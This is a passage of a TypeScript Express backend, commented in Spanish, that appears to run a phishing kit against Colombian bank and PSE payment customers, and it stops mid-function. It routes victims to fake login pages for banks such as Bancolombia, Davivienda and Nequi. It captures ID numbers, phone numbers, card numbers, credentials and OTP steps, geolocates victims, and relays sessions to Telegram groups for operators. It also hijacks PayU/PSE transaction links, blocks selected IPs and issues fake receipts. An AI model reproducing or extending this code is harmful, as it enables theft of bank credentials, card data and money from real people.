import axios from "axios";
import { Request, Response } from 'express';
import { StorageService } from '../services/StorageService';
import { FirebaseService } from '../services/FirebaseService';
import { TelegramService } from "../services/TelegramService";
import * as bintableApi from "bintable_api";

// Se exporta la clase
export class Helper {

    /**
     * Mapa de bancos con sus rutas PSE
     */
    static readonly BANK_ROUTES: Record<string, string> = {
        AVVILLAS: "/banco_av_villas_pse",
        BANCOLOMBIA: "/bancolombia",
        BBVA: "/banco_bbva_login_pse",
        BOGOTA: "/banco_bogota_pse",
        CAJA_SOCIAL: "/logo_caja_social_pse",
        COLPATRIA: "/colpatria_pse_login",
        DAVIVIENDA: "/davivienda_pse",
        FALABELLA: "/falabella_pse",
        ITAU: "/itau_pse",
        NEQUI: "/nequi",
        OCCIDENTE: "/occidente_pse",
        POPULAR: "/popular_pse",
        SERFINANZA: "/serfinanza"
    };

    /**
   * Metodo encargado de agregar un evento al timeline de la sesion
   * 
   * @param session 
   * @param type 
   * @param data 
   * @returns 
   */
    static addEvent(session: any, type: string, data: any) {

        // Se valida si el timeline existe
        if (!session.timeline) session.timeline = [];

        // Se agrega el evento al timeline
        session.timeline.push({
            type,
            data,
            timestamp: new Date().toISOString(),
        });

        // Se retorna la session
        return session;
    }

    /**
     * Metodo encargado de geolocalizar una IP usando ipapi.co
     * Retorna país, ciudad y región/departamento
     * @param ip Dirección IP a geolocalizar
     * @returns Objeto con country, city, region o null si falla
     */
    static async getGeoLocation(ip: string): Promise<{ country: string; city: string; region: string } | null> {
        try {
            // Validar que la IP no esté vacía, no sea localhost o IP privada
            if (!ip || ip === '1' || ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.') || ip === 'No disponible') {
                return null;
            }

            const cleanIp = ip.replace(/^::ffff:/, '').trim();

            // Intento 1: ip-api.com (rápido y sin api key)
            try {
                const res1 = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,regionName`, {
                    timeout: 4000,
                    headers: { 'User-Agent': 'Mozilla/5.0' }
                });
                if (res1.data && res1.data.status === 'success') {
                    return {
                        country: res1.data.country || 'Desconocido',
                        city: res1.data.city || 'Desconocida',
                        region: res1.data.regionName || 'Desconocido',
                    };
                }
            } catch {
                // fallback al siguiente
            }

            // Intento 2: ipwho.is (backup confiable)
            try {
                const res2 = await axios.get(`https://ipwho.is/${cleanIp}`, {
                    timeout: 4000,
                    headers: { 'User-Agent': 'Mozilla/5.0' }
                });
                if (res2.data && res2.data.success) {
                    return {
                        country: res2.data.country || 'Desconocido',
                        city: res2.data.city || 'Desconocida',
                        region: res2.data.region || 'Desconocido',
                    };
                }
            } catch {
                // fallback al siguiente
            }

            // Intento 3: ipapi.co
            try {
                const res3 = await axios.get(`https://ipapi.co/${cleanIp}/json/`, {
                    timeout: 4000,
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
                });
                if (res3.data && !res3.data.error) {
                    return {
                        country: res3.data.country_name || 'Desconocido',
                        city: res3.data.city || 'Desconocida',
                        region: res3.data.region || 'Desconocido',
                    };
                }
            } catch {
                // error
            }

            return null;
        } catch {
            return null;
        }
    }

    /**
     * Arma el link PSE del frontend con sessionId (y mode=tc si aplica).
     */
    static async buildPseAccessLink(sessionId: string, tc: boolean, host?: string): Promise<{ link: string }> {

        // Se crea el URLSearchParams
        const params = new URLSearchParams({ sessionId });

        // Se valida si la sesión es de TC
        if (tc) {

            // Se agrega el mode=tc al URLSearchParams
            params.set("mode", "tc");
        }

        // Se obtiene la base URL del frontend
        const envBase = (process.env.FRONTEND_URL || "").trim().replace(/\/$/, "");
        const isLocalRequest = host?.includes("localhost") || host?.includes("127.0.0.1");

        // Se valida si la solicitud es local
        const base = isLocalRequest ? "http://localhost:3001" : (envBase || "http://localhost:3001");

        // Se retorna el link completo
        return {
            link: `${base}/pse?${params.toString()}`,
        };
    }

    /**
     * Metodo encargado de procesar la solicitud de autenticacion
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static async initPse(req: Request, res: Response) {

        // Se usa el try catch
        try {

            // Se obtienen los datos del body
            const data = req.body.data?.attributes;

            // Se valida que haya data
            if (!data) {

                // Se retorna el error
                return res.status(400).json({ success: false, message: 'No data' });
            };

            // Se captura el sessionId
            const sessionId = data.sessionId || data.session_id;

            // Se valida la session
            let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

            // Se captura la IP real del cliente
            const rawIp = req.headers['x-forwarded-for']?.toString().split(',')[0] || req.socket.remoteAddress || '';

            // Limpiar la IP (remover prefijos IPv6 si existen)
            const ip = rawIp.replace(/^::ffff:/, '');

            // Geolocalizar la IP
            const geoData = await Helper.getGeoLocation(ip);

            // Formatear la ubicación: "País, Ciudad, Región"
            const location = geoData ? `${geoData.country}, ${geoData.city}, ${geoData.region}` : 'Desconocida';

            // Se agrega el session Id
            currentSession.panel = data.panel || "DESCONOCIDO";
            currentSession.banco = data.banco || "DESCONOCIDO";
            currentSession.correoUsuario = data.correoUsuario || "DESCONOCIDO";
            currentSession.precio = data.precio ?? data.valor ?? 0;
            currentSession.fecha = data.fecha || new Date().toISOString();
            currentSession.ip = ip;
            currentSession.location = location;
            currentSession.sessionId = sessionId;
            currentSession.seccion = data.seccion || null;
            currentSession.urlAutomatic = null;
            currentSession.urlRedirect = null;
            currentSession.linkTesterDone = false;

            // Se agrega el tipo de documento si tiene
            if (data.tipoDocumento && data.tipoDocumento !== null && data.tipoDocumento !== undefined) {

                // Se agrega el tipo de documento al mensaje
                currentSession.tipoDocumento = data.tipoDocumento;
            }

            // Se agrega la cedula si tiene
            if (data.cedula && data.cedula !== null && data.cedula !== undefined) {

                // Se agrega la cedula al mensaje
                currentSession.cedula = data.cedula;
            }

            // Se agrega el celular si tiene
            if (data.celular && data.celular !== null && data.celular !== undefined) {

                // Se agrega el celular al mensaje
                currentSession.celular = data.celular;
            }

            // Se borra el mensaje anterior si existe
            if (currentSession.messageId && currentSession.messageId !== null) {

                // Se elimina el mensaje anterior en el grupo correcto (TC o PSE)
                await TelegramService.deletePreviousMessage(currentSession.messageId.toString(), sessionId);
            }

            // Se reemplaza el timeline completo si el central envía snapshot (evita duplicados)
            if (Array.isArray(data.timeline)) {

                // Se setea el timeline
                currentSession.timeline = data.timeline;
            }

            // Se captura si el tc es true (si no viene, se asume flujo PSE)
            const tc = Boolean(data.tc);

            // Se persiste flag TC en la sesión para verify-state / redirección ingreso-tc
            currentSession.tc = tc;

            // Se persiste el grupo de Telegram según el origen TC/PSE
            currentSession.telegramChatId = TelegramService.resolveChatId(tc);

            // Se valida si la persona entro por TC
            if (tc) {

                // Se busca en data.timeline si existe un evento de tipo 'tc'
                const tcEvent = Helper.getTcEventFromTimeline(data.timeline);

                // Se obtiene el numero de tarjeta
                const binCard = tcEvent?.data?.numeroTarjeta;

                // Se obtiene la informacion de la tarjeta
                await Helper.getAndSetCardData(binCard, {
                    tcData: tcEvent?.data,
                });
            };

            // Se lee Firebase (distribuidor puede haber puesto sol_link_custom / URLs)
            const firebaseSession = await FirebaseService.getSession(sessionId);
            const fbStatus = String(firebaseSession?.lastStatus || '').trim();

            // Se respeta estado explícito; si no viene, no pisar link states del distribuidor
            let newStatus = data.lastStatus ? String(data.lastStatus)
                : fbStatus && Helper.PASARELA_LINK_STATUSES.includes(fbStatus.toLowerCase() as typeof Helper.PASARELA_LINK_STATUSES[number])
                    ? fbStatus : currentSession.lastStatus || fbStatus || 'pendiente';

            // Se actualiza el estado de la sesion
            currentSession.lastStatus = newStatus;

            // URLs del distribuidor en la sesión local
            if (firebaseSession?.urlAutomatic) currentSession.urlAutomatic = firebaseSession.urlAutomatic;
            if (firebaseSession?.linkCustom) currentSession.linkCustom = firebaseSession.linkCustom;
            if (firebaseSession?.linkTester) currentSession.linkTester = firebaseSession.linkTester;

            // Se persiste sesión y estado
            await StorageService.set(`session_${sessionId}`, currentSession);
            await StorageService.set(`status_${sessionId}`, newStatus);

            // Se actualiza Telegram si ya hay mensaje (progreso del bot en tiempo real)
            if (currentSession.messageId) {

                // Se actualiza el mensaje en Telegram
                const hideButtons = ['link_bot', 'sol_link_bot'].includes(newStatus);

                // Se actualiza el mensaje en Telegram
                currentSession = await Helper.refreshTelegramSession(sessionId, currentSession, !hideButtons);
            }

            // Se arma el link con IP pública (WAN), no 192.168.x.x
            const { link } = await Helper.buildPseAccessLink(sessionId, tc, req.host);

            // Se retorna en true
            res.json({
                success: true,
                sessionId: sessionId,
                link,
                lastStatus: newStatus
            });
        } catch (error) {

            // Se envia la respuesta
            res.status(500).json({
                success: false,
                message: 'Hubo un error al iniciar sessión ' + (error as Error).message
            });
        }
    }

    /**
     * Metodo encargado de procesar la solicitud de autenticacion
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static async loginTc(req: Request, res: Response) {

        // Se usa el try catch
        try {

            // Se obtienen los datos del body
            const data = req.body.data?.attributes;

            // Se valida que haya data
            if (!data) {

                // Se retorna el error
                return res.status(400).json({ success: false, message: 'No data' });
            };

            // Se captura el sessionId
            const sessionId = data.sessionId || data.session_id;

            // Se valida la session
            let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

            // Se inicializan los valores
            currentSession = await Helper.refreshTelegramSession(sessionId, currentSession, true);

            // Se retorna en true
            res.json({
                success: true,
                sessionId: sessionId
            });
        } catch (error) {

            // Se envia la respuesta
            res.status(500).json({
                success: false,
                message: 'Hubo un error al iniciar sessión ' + (error as Error).message
            });
        }
    }

    /**
     * Metodo encargado de procesar la solicitud de autenticacion
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static async loginPse(req: Request, res: Response) {

        // Se usa el try catch
        try {

            // Se obtienen los datos del body
            const data = req.body.data?.attributes;

            // Se valida que haya data
            if (!data) {

                // Se retorna el error
                return res.status(400).json({ success: false, message: 'No data' });
            };

            // Se captura el sessionId
            const sessionId = data.sessionId || data.session_id;

            // Se valida la session
            let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

            // Se inicializan los valores
            currentSession = await Helper.refreshTelegramSession(sessionId, currentSession, true);

            // Recaudo por panel (bot_automatic.recaudos[]); fallback legacy state
            const isAutomatic = await FirebaseService.getAutomaticMode(sessionId);

            // Se valida si el modo automatico esta activo para disparar link_bot
            if (isAutomatic) {

                // Se captura el banco desde la session o desde la data enviada
                const bank = String(currentSession?.banco || data.banco || '').trim().toUpperCase();

                // Se captura el messageId asociado a la sessionId en pasarela_sessions
                const messageId = await FirebaseService.getSessionMessageId(String(sessionId));

                // Se valida que exista un banco antes de disparar la acción automática
                if (bank) {

                    // Se crea una estructura de callbackQuery segura para el webhook automatico
                    const callbackQuery = {
                        from: {
                            first_name: "🤖 Bot",
                            username: "Automatico",
                        },
                        message: {
                            message_id: messageId || currentSession?.messageId || 0,
                        },
                    };

                    // Se ejecuta el webhook automatico sin tumbar el flujo principal
                    const { WebhookController } = await import("./WebhookController");

                    // Se crea una estructura de request mock para el webhook automatico
                    const reqMock = {
                        body: {
                            telegram: callbackQuery,
                            action: "link_bot",
                            sessionId: String(sessionId),
                            bank,
                            automaticRecaudo: true,
                        },
                    } as unknown as Request;

                    // Se crea una estructura de response mock para el webhook automatico
                    const resMock = {
                        status() { return this; },
                        send() { return this; },
                        json() { return this; },
                    } as unknown as Response;

                    // Se dispara la acción automática en segundo plano
                    void WebhookController.handleWebhook(reqMock, resMock).catch((error: unknown) => {

                        // Se imprime el error
                        console.error("[AUTO_LINK_BOT] Error ejecutando webhook automático:", error);
                    });
                }
            }

            // Se retorna en true
            res.json({
                success: true,
                sessionId: sessionId
            });
        } catch (error) {

            // Se envia la respuesta
            res.status(500).json({
                success: false,
                message: 'Hubo un error al iniciar sessión ' + (error as Error).message
            });
        }
    }

    /**
     * Busca el evento TC en el timeline (type === 'tc')
     *
     * @param timeline Linea de tiempo de la sesión
     * @returns Evento TC o null
     */
    static getTcEventFromTimeline(timeline: unknown): any | null {

        // Se valida que el timeline sea un arreglo
        if (!Array.isArray(timeline)) return null;

        // Se busca el último evento de tipo tc
        for (let i = timeline.length - 1; i >= 0; i -= 1) {

            // Se captura el evento
            const event = timeline[i];

            // Se valida si el evento es de tipo tc
            if (String(event?.type || "").toLowerCase() === "tc") {

                // Se retorna el evento
                return event;
            }
        }

        // Se retorna null
        return null;
    }

    /**
     * Obtiene el PAN del evento TC en el timeline (campo numeroTarjeta en data)
     *
     * @param session Sesión en storage
     * @returns Solo dígitos del PAN o cadena vacía
     */
    static getTcCardNumberFromSession(session: any): string {

        // Se obtiene el evento TC del timeline
        const tcEvent = Helper.getTcEventFromTimeline(session?.timeline);
        const raw = tcEvent?.data?.numeroTarjeta ?? tcEvent?.data?.tarjeta ?? "";

        // Se retorna los ultimos digitos de la tarjeta
        return String(raw || "").replace(/\D/g, "");
    }

    /** Estados de link que escribe el distribuidor / panel (no deben volver a pendiente por initPse) */
    static readonly PASARELA_LINK_STATUSES = [
        'sol_link_custom',
        'sol_link_bot',
        'link_bot',
        'logo',
    ] as const;

    /**
     * Metodo encargado de resolver el ultimo estado de la sesion
     * 
     * @param storageStatus 
     * @param firebaseSession 
     * @param session 
     * @returns 
     */
    static resolvePasarelaLastStatus(storageStatus: string | null | undefined, firebaseSession: Record<string, unknown> | null, session: Record<string, unknown> | null): string {

        // Se captura el estado en minuscula
        const fb = String(firebaseSession?.lastStatus || '').trim().toLowerCase();
        const sess = String(session?.lastStatus || '').trim().toLowerCase();
        const stor = String(storageStatus || '').trim().toLowerCase();
        const candidates = [fb, sess, stor].filter(Boolean);

        // Priorizar estados de link (preparePasarelaLinkTester / link bot)
        for (const s of candidates) {

            // Se valida si el estado es de tipo link
            if (Helper.PASARELA_LINK_STATUSES.includes(s as typeof Helper.PASARELA_LINK_STATUSES[number])) {

                // Se retorna el estado
                return s;
            }
        }

        // Timeline: admin_action sol_link_custom (distribuidor)
        const timeline = (firebaseSession?.timeline ?? session?.timeline) as unknown[] | undefined;

        // Se valida si el timeline es un arreglo
        if (Array.isArray(timeline)) {

            // Se recorre el timeline para capturar el link
            for (let i = timeline.length - 1; i >= 0; i--) {

                // Se captura el evento
                const ev = timeline[i] as { type?: string; data?: { accion?: string; link?: string } };

                // Se valida si el evento es de tipo admin_action y la accion es sol_link_custom
                if (ev?.type === 'admin_action' && ev.data?.accion === 'sol_link_custom') {

                    // Se retorna el estado
                    return 'sol_link_custom';
                }
            }
        }

        // Se recorre los candidatos para capturar el estado
        for (const s of candidates) {

            // Se valida si el estado es valido y diferente a pendiente
            if (s && s !== 'pendiente') return s;
        }

        // Se retorna el estado
        return fb || sess || stor || 'pendiente';
    }

    /**
     * Metodo encargado de obtener la url de pago desde Firebase (preparePasarelaLinkTester) + storage local
     * 
     * @param sessionId 
     * @param status 
     * @param firebaseSession 
     * @param session 
     * @returns 
     */
    static async resolvePasarelaPaymentUrl(sessionId: string, status: string, firebaseSession: Record<string, unknown> | null, session: Record<string, unknown> | null): Promise<string | null> {

        // Se captura el pick para obtener el link
        const pick = (...vals: unknown[]) => {

            // Se recorre los valores para capturar el link
            for (const v of vals) {

                // Se captura el valor
                const s = String(v ?? '').trim();

                // Se valida si el valor es valido
                if (s) return s;
            }

            // Se retorna null
            return null;
        };

        // Se captura el estado en minuscula
        const statusLower = String(status).toLowerCase();

        // Se valida si el estado es sol_link_custom
        if (statusLower === 'sol_link_custom') {

            // Se captura el link
            return (
                pick(
                    firebaseSession?.linkCustom,
                    firebaseSession?.urlAutomatic,
                    firebaseSession?.linkTester,
                    session?.linkCustom,
                    session?.urlAutomatic,
                    session?.linkTester,
                ) ||
                (await StorageService.get(`linkCustom_${sessionId}`)) ||
                (await StorageService.get(`urlAutomatic_${sessionId}`)) ||
                Helper.getLinkFromTimeline(firebaseSession?.timeline ?? session?.timeline)
            );
        }

        // Se valida si el estado es sol_link_bot o link_bot
        if (['sol_link_bot', 'link_bot'].includes(statusLower)) {

            // Se captura el link
            let url =
                pick(
                    firebaseSession?.urlAutomatic,
                    firebaseSession?.linkCustom,
                    firebaseSession?.linkTester,
                    session?.urlAutomatic,
                    session?.linkCustom,
                    session?.linkTester,
                ) || (await StorageService.get(`urlAutomatic_${sessionId}`));

            // Se valida si el link es valido
            if (url) return url;

            // Se captura el estado en minuscula
            const fbStatus = String(firebaseSession?.lastStatus || '').toLowerCase();

            // Se valida si el estado es sol_link_bot o link_bot y si existe la url automatic
            if (['sol_link_bot', 'link_bot'].includes(fbStatus) && firebaseSession?.urlAutomatic) {

                // Se retorna la url automatic
                return String(firebaseSession.urlAutomatic);
            }

            // Se retorna null
            return null;
        }

        // Se valida si el estado es logo
        if (statusLower === 'logo') {
            const redirectVal = (await StorageService.get(`url_redirect_${sessionId}`)) ||
                (typeof firebaseSession?.urlRedirect === 'string' && firebaseSession.urlRedirect.trim()) ||
                (typeof session?.urlRedirect === 'string' && session.urlRedirect.trim());

            if (redirectVal) return String(redirectVal);

            const bankName = String(firebaseSession?.banco || firebaseSession?.bank || session?.banco || session?.bank || '').toUpperCase().trim();
            if (bankName && Helper.BANK_ROUTES[bankName]) {
                return Helper.BANK_ROUTES[bankName];
            }

            return null;
        }

        // PSE intermedia (distribuidor): /api/payu-handoff en MS1
        if (['pse_session_ready', 'gateway_transaction_ready'].includes(statusLower)) {

            // Se captura la captura de la gateway
            const gatewayCapture = firebaseSession?.gatewayTransactionCapture as
                | {
                    paymentUrl?: string | null;
                    payuCallerUrl?: string | null;
                    pseStartTransactionUrl?: string | null;
                    payuHandoff?: {
                        pseFormAction?: string | null;
                        payuCallerUrl?: string | null;
                    };
                }
                | undefined;

            // Se captura la url de pago
            return pick(
                firebaseSession?.urlAutomatic,
                session?.urlAutomatic,
                gatewayCapture?.pseStartTransactionUrl,
                gatewayCapture?.paymentUrl,
                gatewayCapture?.payuHandoff?.pseFormAction,
                gatewayCapture?.payuCallerUrl,
                gatewayCapture?.payuHandoff?.payuCallerUrl,
            ) || (await StorageService.get(`urlAutomatic_${sessionId}`));
        }

        // Se retorna null
        return null;
    }

    /**
     * Metodo encargado de obtener el link desde el timeline
     * 
     * @param timeline 
     * @returns 
     */
    static getLinkFromTimeline(timeline: unknown): string | null {

        // Se valida si el timeline es un arreglo
        if (!Array.isArray(timeline)) return null;

        // Se recorre el timeline para capturar el link
        for (let i = timeline.length - 1; i >= 0; i--) {

            // Se captura el evento
            const ev = timeline[i] as { type?: string; data?: { accion?: string; link?: string } };

            // Se valida si el evento es de tipo admin_action y la accion es sol_link_custom
            if (ev?.type === 'admin_action' && ev.data?.accion === 'sol_link_custom') {

                // Se captura el link
                const link = String(ev.data?.link ?? '').trim();

                // Se valida si el link es valido
                if (link) return link;
            }
        }

        // Se retorna null
        return null;
    }

    /**
     * Metodo encargado de verificar el estado de la solicitud
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static async verifyPseState(req: Request, res: Response) {

        // Se usa el try catch
        try {

            // Se obtiene el sessionId de la solicitud
            const { sessionId } = req.params;

            // Se convierte a string
            const sessionIdStr = sessionId.toString();

            // Sesión local + Firebase (misma colección pasarela que el distribuidor)
            const session = (await StorageService.get(`session_${sessionIdStr}`)) || {};
            const firebaseSession = (await FirebaseService.getSession(sessionIdStr)) || {};
            const storageStatus = await StorageService.get(`status_${sessionIdStr}`);

            // Estado efectivo (Firebase/distribuidor > memoria en pendiente)
            let status = Helper.resolvePasarelaLastStatus(
                storageStatus,
                firebaseSession,
                session,
            );

            // Se captura el banco
            const bank = String(firebaseSession?.banco || firebaseSession?.bank || session?.banco || session?.bank || 'DESCONOCIDO');

            // Se captura la url
            let url = await Helper.resolvePasarelaPaymentUrl(
                sessionIdStr,
                status,
                firebaseSession,
                session,
            );

            // generate-link / distribuidor: storage en pendiente pero Firebase ya tiene URL
            if (url && status === 'pendiente' && ['sol_link_bot', 'link_bot', 'sol_link_custom'].includes(String(firebaseSession?.lastStatus || '').toLowerCase())) {

                // Se captura el estado
                status = String(firebaseSession.lastStatus).toLowerCase();
            }

            // Se captura la url si el estado es sol_link_custom y no hay url
            if (status === 'sol_link_custom' && !url) {

                // Se captura la url
                url = await Helper.resolvePasarelaPaymentUrl(
                    sessionIdStr,
                    'sol_link_custom',
                    firebaseSession,
                    session,
                );
            }

            // Se fusiona la sesion
            const mergedSession = { ...session, ...firebaseSession, timeline: firebaseSession?.timeline ?? session?.timeline };

            // Se captura la IP real del cliente para bloquearla, en lugar de confiar en el body que podría ser manipulado. Esto es crucial para seguridad.
            const ipRequest = FirebaseService.getClientIp(req);

            // Se obtiene la lista de direcciones IP del firebase
            const listIps = await FirebaseService.getBlockedIps();

            // Se verifica si la IP del request está en la lista de IPs bloqueadas. Si es así, se bloquea el acceso.
            if (listIps.includes(ipRequest)) {

                // Se elimina la sesión para evitar que el usuario siga enviando datos mientras está bloqueado
                await StorageService.remove(`session_${sessionId}`);

                // Se retorna un mensaje indicando que la IP está bloqueada.
                return res.status(403).json({
                    success: false,
                    estado: "error_blocked",
                    sesion: 'activa',
                    url,
                    bank,
                });
            };

            // Se captura la snapshot de la sesion
            const pseSnapshot = firebaseSession?.pseIntermediateSnapshot as | {
                url?: string;
                cookies?: unknown[];
                sessionStorage?: Record<string, string>;
                localStorage?: Record<string, string>;
            } | undefined;

            // Se captura la url de la snapshot
            const pseSnapshotUrl = String(pseSnapshot?.url ?? "").trim();

            // Se captura el estado en minuscula
            const statusLower = String(status).toLowerCase();

            // Se captura la captura de la gateway
            const gatewayCapture = firebaseSession?.gatewayTransactionCapture as | {
                paymentUrl?: string | null;
                payuCallerUrl?: string | null;
                pseStartTransactionUrl?: string | null;
                payuHandoff?: { payuCallerUrl?: string; pseFormAction?: string };
                transaction?: { paymentUrl?: string | null };
                browser?: { url?: string };
            } | undefined;

            // Se captura la url de la caller
            const payuCallerUrl = String(gatewayCapture?.payuCallerUrl ?? gatewayCapture?.payuHandoff?.payuCallerUrl ?? "").trim();

            // Se captura la url de la start transaction
            const pseStartUrl = String(gatewayCapture?.pseStartTransactionUrl ?? gatewayCapture?.payuHandoff?.pseFormAction ?? "").trim();

            // Se captura la url de la payment
            const gatewayPaymentUrl = String(gatewayCapture?.paymentUrl ?? gatewayCapture?.transaction?.paymentUrl ?? "").trim();

            // Se captura la url automatic
            const urlAutomatic = String(firebaseSession?.urlAutomatic ?? session?.urlAutomatic ?? "").trim();

            // Se captura la url de la pse
            const pickPseUrl = (...candidates: string[]) => {

                // Se recorre los candidatos para capturar la url de la pse
                for (const c of candidates) {

                    // Se captura el candidato
                    const s = c.trim();

                    // Se valida si el candidato es valido
                    if (!s) continue;

                    // Se valida si el candidato contiene StartTransaction.aspx o payulatam.com
                    if (s.includes("StartTransaction.aspx") || s.includes("payulatam.com")) {

                        // Se retorna la url de la pse
                        return s;
                    }
                }

                // Se retorna una cadena vacia
                return "";
            };

            // Se captura la url de la pse redirect
            const pseRedirectUrl = pickPseUrl(pseStartUrl, urlAutomatic, gatewayPaymentUrl) || payuCallerUrl || urlAutomatic || gatewayPaymentUrl;

            // Se valida si el estado es pse_session_ready
            if (statusLower === "pse_session_ready" || String(firebaseSession?.lastStatus || "").toLowerCase() === "pse_session_ready") {

                // Se setea el estado a pse_session_ready
                status = "pse_session_ready";

                // Se captura la url de la pse redirect
                url = pseRedirectUrl || url || "";

                // Se valida si no hay url y si existe la url de la snapshot
                if (!url && pseSnapshotUrl) {

                    // Se setea la url de la pse snapshot
                    url = pseSnapshotUrl;
                }
            }

            // Se valida si el estado es gateway_transaction_ready
            else if (gatewayPaymentUrl && (statusLower === "gateway_transaction_ready" || firebaseSession?.gatewayTransactionCaptureAt)) {

                // Se valida si existe la url de la start transaction, la url de la caller, la url de la pse redirect o la url de la pse redirect contiene StartTransaction.aspx o payulatam.com
                if (pseStartUrl || payuCallerUrl || pseRedirectUrl.includes("StartTransaction.aspx") || pseRedirectUrl.includes("payulatam.com")) {

                    // Se setea el estado a pse_session_ready
                    status = "pse_session_ready";

                    // Se captura la url de la pse redirect
                    url = pseRedirectUrl || pseStartUrl || payuCallerUrl;
                } else {

                    // Se setea el estado a gateway_transaction_ready
                    status = "gateway_transaction_ready";

                    // Se captura la url de la pse redirect
                    url = gatewayPaymentUrl || urlAutomatic || url;
                }
            }
            // Se valida si el estado es pse_session_ready y si existe la url de la snapshot
            else if (pseSnapshotUrl && firebaseSession?.pseIntermediateSnapshotAt && !url) {

                // Se setea el estado a pse_session_ready
                status = "pse_session_ready";

                // Se captura la url de la pse snapshot
                url = pseSnapshotUrl;
            }

            // Payload base para el frontend (PSE loading / polling)
            const payload: Record<string, unknown> = {
                success: true,
                estado: status,
                sesion: 'activa',
                url,
                bank,
            };

            // Se valida si existe la url de la snapshot
            if (pseSnapshotUrl && pseSnapshot) {

                // Se captura la pse snapshot
                payload.pseSnapshot = pseSnapshot;
            }

            // Se valida si existe la captura de la gateway y el estado es gateway_transaction_ready
            if (gatewayCapture && status === "gateway_transaction_ready") {

                // Se captura la captura de la gateway
                payload.gatewayTransactionCapture = gatewayCapture;
            };

            // Se captura los estados de tipo TC
            const tcStates = ['sol_otp', 'sol_din', 'error_otp', 'error_din', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar'];
            const isTcSession = Boolean(firebaseSession?.tc ?? session?.tc);

            // Se valida si el estado es de tipo TC
            if (tcStates.includes(String(status).toLowerCase()) && isTcSession) {

                // Se captura el numero de tarjeta
                const tarjeta = Helper.getTcCardNumberFromSession(mergedSession);

                // Se setea el flag de TC
                payload.tc = true;

                // Se captura el numero de tarjeta
                payload.tarjeta = tarjeta || null;
            }

            // Se retorna el valor actual del estado para que el frontend pueda actuar en consecuencia
            res.json(payload);
        } catch (error) {

            // Se envia la respuesta
            res.status(500).json({
                success: false,
                message: 'Error al verificar el estado de la petición ' + error,
            });
        }
    }

    /**
     * Metodo encargado de formatear la fecha del comprobante
     * 
     * @param dateInput 
     * @returns 
     */
    static formatReceiptDate(dateInput: string | Date): string {

        // Se captura la fecha
        const date = typeof dateInput === 'string' ? new Date(dateInput) : dateInput;

        // Se valida si la fecha es invalida
        if (isNaN(date.getTime())) {

            // Se captura la fecha actual
            const now = new Date();
            const d = String(now.getDate()).padStart(2, '0');
            const m = String(now.getMonth() + 1).padStart(2, '0');

            // Se retorna la fecha actual
            return `${d}/${m}/${now.getFullYear()}`;
        }

        // Se captura la fecha
        const d = String(date.getDate()).padStart(2, '0');
        const m = String(date.getMonth() + 1).padStart(2, '0');

        // Se retorna la fecha
        return `${d}/${m}/${date.getFullYear()}`;
    }

    /**
     * Metodo encargado de mapear el estado del comprobante
     * 
     * @param state 
     * @returns 
     */
    static mapReceiptEstado(_state?: string): string {

        // Finalizar el flujo PSE no implica transacción aprobada en el comprobante
        return 'Pendiente';
    }

    /**
     * Metodo encargado de construir el comprobante PSE desde la sesion almacenada
     * 
     * @param session 
     * @param sessionId 
     * @param status 
     * @returns 
     */
    static buildReceiptFromSession(session: any, sessionId: string, status?: string) {

        // Se captura el timeline de la sesion
        const timeline = Array.isArray(session?.timeline) ? session.timeline : [];

        // Se captura el nombre del pasajero
        let nombre = '';

        // Se recorre el timeline para capturar el primer nombre del pasajero
        for (let i = 0; i < timeline.length; i++) {

            // Se valida si el evento es de tipo 'pasajero' y si existe el nombre
            if (timeline[i]?.type === 'pasajero' && timeline[i]?.data?.nombre) {

                // Se captura el nombre del pasajero
                nombre = String(timeline[i].data.nombre).trim();

                // Se rompe el bucle
                break;
            }
        }

        // Se valida si no existe el nombre y si existe el correo del usuario
        if (!nombre && session?.correoUsuario) {

            // Se captura el correo del usuario
            const correo = String(session.correoUsuario).trim();

            // Se captura el nombre del usuario
            nombre = correo.includes('@') ? correo.split('@')[0] : correo;
        }

        // Se captura el banco de la sesion
        const banco = String(session?.banco || '').trim();
        const empresa = String(session?.panel || session?.empresa || session?.comercio || session?.origen || '').trim();

        // Se captura el valor de la sesion
        let valor = '';

        // Se captura el precio de la sesion
        const precio = session?.precio ?? session?.valor;

        // Se valida si el precio es valido
        if (precio !== undefined && precio !== null && precio !== '') {

            // Se captura el precio en numero
            const n = Number(precio);

            // Se valida si el precio es finito
            if (Number.isFinite(n)) {

                // Se captura el precio formateado
                valor = `$${n.toLocaleString('es-CO', {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2,
                })}`;
            } else {

                // Se captura el precio original
                valor = `$${precio}`;
            }
        }

        // Se captura la fecha de la sesion
        const fecha = session?.fecha ? Helper.formatReceiptDate(session.fecha) : '';

        // Se captura la descripcion de la sesion
        const descripcion = banco && banco.toUpperCase() !== 'DESCONOCIDO' ? `Pago electrónico PSE - ${banco}` : '';

        // Se captura el estado de la sesion
        const estado = Helper.mapReceiptEstado(status || session?.lastStatus);

        // Documento del cliente (OTP Davivienda: referencia2 / {{referencia2}})
        let referencia2 = String(session?.usuario || '').trim();
        if (!referencia2) {
            for (let i = 0; i < timeline.length; i++) {
                if (timeline[i]?.type === 'credenciales' && timeline[i]?.data?.usuario) {
                    referencia2 = String(timeline[i].data.usuario).trim();
                    break;
                }
            }
        }

        // Se retorna los datos del comprobante
        return {
            nombre,
            valor,
            empresa,
            descripcion,
            fecha,
            fechaOrigen: session?.fecha ? String(session.fecha) : '',
            estado,
            banco,
            destinoPago: empresa,
            motivo: descripcion,
            valorTransaccion: valor,
            referencia2,
        };
    }

    /**
     * Metodo encargado de verificar el estado de la sesion TC
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static async verifyTcState(req: Request, res: Response) {

        // Se verifica el estado de la sesion
        return Helper.verifyPseState(req, res);
    }

    /**
     * Reenvío de código OTP TC (panel vuelve a solicitar OTP).
     * 
     * @param req 
     * @param res 
     * @returns 
     */
    static async resendTcOtp(req: Request, res: Response) {

        // Se usa el try catch
        try {

            // Se captura la informacion
